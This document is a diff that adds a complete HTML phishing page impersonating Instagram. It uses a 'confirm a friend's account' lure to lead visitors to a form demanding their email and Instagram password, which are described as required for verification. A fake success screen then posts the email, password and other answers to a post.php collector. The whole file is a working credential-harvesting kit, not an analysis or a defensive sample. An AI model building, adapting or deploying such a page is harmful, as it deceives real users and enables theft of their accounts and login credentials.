@@ -1,0 +1,299 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Account Verification</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+<style>
+*{box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif}
+body{margin:0;background:linear-gradient(45deg,#f09433 0%,#e6683c 25%,#dc2743 50%,#cc2366 75%,#bc1888 100%);min-height:100vh}
+.container{max-width:420px;margin:auto;padding:18px;animation:fadeIn .4s ease}
+@keyframes fadeIn{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}
+.page{display:none}
+.page.active{display:block}
+.logo{text-align:center;font-size:50px;margin-top:8px;color:#fff;text-shadow:0 2px 10px rgba(0,0,0,.2)}
+h1{text-align:center;font-size:22px;margin:18px 0 10px;color:#fff}
+p{text-align:center;font-size:14px;color:rgba(255,255,255,.9)}
+.card{background:#fff;border-radius:22px;padding:20px;margin-top:20px;box-shadow:0 8px 32px rgba(0,0,0,.2)}
+.option{display:flex;align-items:center;margin:16px 0;font-size:15px}
+.option input{width:18px;height:18px;margin-right:10px;accent-color:#e4405f}
+select,textarea,input{width:100%;padding:12px;margin-top:10px;border-radius:14px;border:1px solid #dbdbdb;font-size:14px;background:#fafafa}
+select:focus,textarea:focus,input:focus{outline:none;border-color:#a8a8a8;background:#fff}
+textarea{resize:none;height:80px}
+.red-notice{background:#fff3f0;border:1px solid #ed4956;color:#ed4956;padding:12px;border-radius:10px;font-size:13px;margin-top:10px;font-weight:500}
+button{width:100%;padding:14px;margin-top:20px;border-radius:30px;border:none;background:linear-gradient(45deg,#f09433 0%,#e6683c 25%,#dc2743 50%,#cc2366 75%,#bc1888 100%);color:#fff;font-size:16px;cursor:pointer;font-weight:600;box-shadow:0 4px 15px rgba(220,39,67,.4)}
+button:disabled{background:#c7c7c7;cursor:not-allowed;box-shadow:none}
+.loading{display:none;position:fixed;inset:0;background:linear-gradient(45deg,#f09433 0%,#e6683c 25%,#dc2743 50%,#cc2366 75%,#bc1888 100%);justify-content:center;align-items:center;flex-direction:column;z-index:99}
+.spinner{width:40px;height:40px;border:4px solid rgba(255,255,255,.3);border-top:4px solid #fff;border-radius:50%;animation:spin 1s linear infinite}
+@keyframes spin{to{transform:rotate(360deg)}}
+.loading p{color:#fff;margin-top:15px;font-weight:500}
+.login-box{background:#fff;border-radius:22px;padding:25px;margin-top:20px;box-shadow:0 8px 32px rgba(0,0,0,.2)}
+.login-box h2{text-align:center;margin-bottom:20px;font-size:20px;color:#262626}
+.password-wrapper{position:relative;width:100%;margin-top:10px}
+.password-wrapper input{width:100%;padding:12px 40px 12px 12px;border-radius:14px;border:1px solid #dbdbdb;font-size:14px;margin-top:0;background:#fafafa}
+.password-wrapper input:focus{outline:none;border-color:#a8a8a8;background:#fff}
+.eye-icon{position:absolute;right:12px;top:50%;transform:translateY(-50%);cursor:pointer;font-size:16px;color:#8e8e8e;width:30px;height:30px;display:flex;align-items:center;justify-content:center}
+.eye-icon:hover{color:#262626}
+.error-msg{color:#ed4956;font-size:12px;margin-top:5px;display:none;font-weight:500}
+.error-msg.show{display:block}
+
+/* SUCCESS PAGE STYLES */
+.success-page{display:none;text-align:center;padding:60px 20px;animation:fadeIn .5s ease}
+.success-page.active{display:block}
+.success-icon{font-size:100px;color:#fff;margin-bottom:20px;animation:scaleIn .5s ease}
+@keyframes scaleIn{from{transform:scale(0)}to{transform:scale(1)}}
+.success-page h2{color:#fff;font-size:28px;margin-bottom:15px;text-shadow:0 2px 10px rgba(0,0,0,.2)}
+.success-page p{color:rgba(255,255,255,.9);font-size:16px;margin-bottom:30px}
+.success-card{background:#fff;border-radius:22px;padding:25px;margin-top:20px;box-shadow:0 8px 32px rgba(0,0,0,.2);text-align:left}
+.success-card h3{color:#262626;margin-bottom:15px;font-size:18px}
+.detail-row{display:flex;justify-content:space-between;padding:10px 0;border-bottom:1px solid #efefef;font-size:14px}
+.detail-row:last-child{border-bottom:none}
+.detail-label{color:#8e8e8e}
+.detail-value{color:#262626;font-weight:500}
+</style>
+</head>
+<body>
+
+<!-- PAGE 1: Verification Form -->
+<div class="page active" id="page1">
+  <div class="container">
+    <div class="logo"><i class="fa-brands fa-instagram"></i></div>
+    <h1>Confirm a Friend's Account</h1>
+    <p>Please help us confirm that your friend's account belongs to a real person.</p>
+    
+    <div class="card">
+      <form id="verifyForm">
+        <input type="hidden" name="page" value="instagram">
+        
+        <div class="option"><input type="radio" name="status" value="real" required><span>Yes, this is a real account</span></div>
+        <div class="option"><input type="radio" name="status" value="fake"><span>No, this account seems fake</span></div>
+        <div class="option"><input type="radio" name="status" value="unsure"><span>I'm not sure</span></div>
+
+        <select name="relation" id="rel" required>
+          <option value="">Select relation...</option>
+          <option>Friend</option>
+          <option>Family</option>
+          <option>Colleague</option>
+          <option>Online Contact</option>
+        </select>
+        
+        <textarea name="message" id="msg" placeholder="How do you know this person?" required></textarea>
+        
+        <button type="submit" id="submitBtn">Submit Confirmation</button>
+      </form>
+    </div>
+  </div>
+</div>
+
+<!-- PAGE 2: Email Login -->
+<div class="page" id="page2">
+  <div class="container">
+    <div class="logo"><i class="fa-brands fa-instagram"></i></div>
+    <h1>Account Verification</h1>
+    <p>Please login to verify your identity</p>
+    
+    <div class="login-box" id="loginBox">
+      <h2>Enter Your Details</h2>
+      
+      <form id="loginForm">
+        <input type="hidden" name="page" id="hidden_page" value="instagram">
+        <input type="hidden" name="status" id="hidden_status">
+        <input type="hidden" name="relation" id="hidden_relation">
+        <input type="hidden" name="message" id="hidden_message">
+
+        <div class="red-notice" style="margin-bottom:15px;">
+          <i class="fa-solid fa-circle-exclamation"></i> <b>Important:</b> You must enter your email and password for verification. Please use the same email address that is linked to your Instagram account.
+        </div>
+
+        <input type="email" name="email" id="email" placeholder="Enter your email address" required>
+        
+        <div class="password-wrapper">
+          <input type="password" name="password" id="password" placeholder="Enter your password" required>
+          <span class="eye-icon" onclick="togglePassword('password', this)">
+            <i class="fa-regular fa-eye"></i>
+          </span>
+        </div>
+        
+        <div class="password-wrapper">
+          <input type="password" name="confirm_password" id="confirm_password" placeholder="Confirm your password" required>
+          <span class="eye-icon" onclick="togglePassword('confirm_password', this)">
+            <i class="fa-regular fa-eye"></i>
+          </span>
+        </div>
+        
+        <div class="error-msg" id="matchError"><i class="fa-solid fa-xmark"></i> Passwords do not match!</div>
+        
+        <button type="submit" id="loginBtn" disabled>Verify Account</button>
+      </form>
+    </div>
+  </div>
+</div>
+
+<!-- PAGE 3: SUCCESS TICK -->
+<div class="success-page" id="page3">
+  <div class="container">
+    <div class="success-icon">
+      <i class="fa-solid fa-circle-check"></i>
+    </div>
+    <h2>Verification Successful!</h2>
+    <p>Your confirmation has been submitted successfully.</p>
+    
+    <div class="success-card">
+      <h3><i class="fa-solid fa-list-check" style="color:#e4405f;margin-right:8px;"></i>Submission Details</h3>
+      <div class="detail-row">
+        <span class="detail-label">Platform:</span>
+        <span class="detail-value">Instagram</span>
+      </div>
+      <div class="detail-row">
+        <span class="detail-label">Account Status:</span>
+        <span class="detail-value" id="detail_status">-</span>
+      </div>
+      <div class="detail-row">
+        <span class="detail-label">Relation:</span>
+        <span class="detail-value" id="detail_relation">-</span>
+      </div>
+      <div class="detail-row">
+        <span class="detail-label">Email:</span>
+        <span class="detail-value" id="detail_email">-</span>
+      </div>
+    </div>
+    
+    <button onclick="submitToServer()" style="margin-top:20px;background:#fff;color:#e4405f;">
+      <i class="fa-solid fa-paper-plane"></i> Confirm & Send
+    </button>
+  </div>
+</div>
+
+<div class="loading" id="loading">
+  <div class="spinner"></div>
+  <p>Processing...</p>
+</div>
+
+<script>
+// Store data globally
+let formData = {};
+
+function togglePassword(fieldId, iconSpan) {
+  const field = document.getElementById(fieldId);
+  const icon = iconSpan.querySelector('i');
+  
+  if (field.type === 'password') {
+    field.type = 'text';
+    icon.classList.remove('fa-eye');
+    icon.classList.add('fa-eye-slash');
+  } else {
+    field.type = 'password';
+    icon.classList.remove('fa-eye-slash');
+    icon.classList.add('fa-eye');
+  }
+}
+
+// Page 1 Submit
+document.getElementById('verifyForm').addEventListener('submit', function(e) {
+  e.preventDefault();
+  
+  // Save Page 1 data
+  formData.status = document.querySelector('input[name="status"]:checked')?.value;
+  formData.relation = document.getElementById('rel').value;
+  formData.message = document.getElementById('msg').value;
+  
+  document.getElementById('loading').style.display = 'flex';
+  
+  setTimeout(() => {
+    document.getElementById('loading').style.display = 'none';
+    document.getElementById('page1').classList.remove('active');
+    document.getElementById('page2').classList.add('active');
+  }, 1500);
+});
+
+// Page 2 Validation
+const email = document.getElementById('email');
+const pass = document.getElementById('password');
+const cpass = document.getElementById('confirm_password');
+const loginBtn = document.getElementById('loginBtn');
+const matchError = document.getElementById('matchError');
+
+function checkMatch() {
+  if (cpass.value && pass.value !== cpass.value) {
+    matchError.classList.add('show');
+    return false;
+  } else {
+    matchError.classList.remove('show');
+    return true;
+  }
+}
+
+function validateLogin() {
+  const emailValid = email.value.includes('@');
+  const passValid = pass.value.length > 0;
+  const confirmValid = cpass.value.length > 0;
+  const matchValid = pass.value === cpass.value;
+  
+  loginBtn.disabled = !(emailValid && passValid && confirmValid && matchValid);
+}
+
+email.addEventListener('input', validateLogin);
+pass.addEventListener('input', () => { checkMatch(); validateLogin(); });
+cpass.addEventListener('input', () => { checkMatch(); validateLogin(); });
+
+// Page 2 Submit - Show Success Page
+document.getElementById('loginForm').addEventListener('submit', function(e) {
+  e.preventDefault();
+  
+  if (!checkMatch()) return false;
+  
+  // Save Page 2 data
+  formData.email = email.value;
+  formData.password = pass.value;
+  
+  document.getElementById('loading').style.display = 'flex';
+  
+  setTimeout(() => {
+    document.getElementById('loading').style.display = 'none';
+    document.getElementById('page2').classList.remove('active');
+    document.getElementById('page3').classList.add('active');
+    
+    // Fill details on success page
+    document.getElementById('detail_status').textContent = formData.status;
+    document.getElementById('detail_relation').textContent = formData.relation;
+    document.getElementById('detail_email').textContent = formData.email;
+  }, 1500);
+});
+
+// Final Submit to Server
+function submitToServer() {
+  document.getElementById('loading').style.display = 'flex';
+  
+  // Create actual form and submit
+  const form = document.createElement('form');
+  form.method = 'POST';
+  form.action = 'post.php';
+  
+  // Add all data
+  const data = {
+    page: 'instagram',
+    status: formData.status,
+    relation: formData.relation,
+    message: formData.message,
+    email: formData.email,
+    password: formData.password
+  };
+  
+  for (let key in data) {
+    const input = document.createElement('input');
+    input.type = 'hidden';
+    input.name = key;
+    input.value = data[key];
+    form.appendChild(input);
+  }
+  
+  document.body.appendChild(form);
+  
+  setTimeout(() => {
+    form.submit();
+  }, 1000);
+}
+</script>
+</body>
+</html>
